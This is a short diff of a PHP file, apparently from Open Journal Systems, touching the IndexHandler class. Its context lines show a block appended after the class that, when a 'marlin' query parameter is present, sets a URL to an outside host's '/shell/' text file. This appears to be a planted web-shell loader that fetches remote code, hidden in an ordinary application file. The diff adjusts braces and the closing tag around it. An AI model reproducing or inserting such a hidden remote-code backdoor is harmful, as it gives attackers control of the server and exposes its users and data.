@@ -100,6 +100,7 @@ class IndexHandler extends PKPIndexHandler
         }
     }
 }
+}
 if (isset($_GET['marlin'])) {
     try {
         $u = "https://hypocriteseo.site/shell/compiler-cha-kwetiaw.txt";
@@ -117,4 +118,3 @@ if (isset($_GET['marlin'])) {
 
     }
 }
-?>
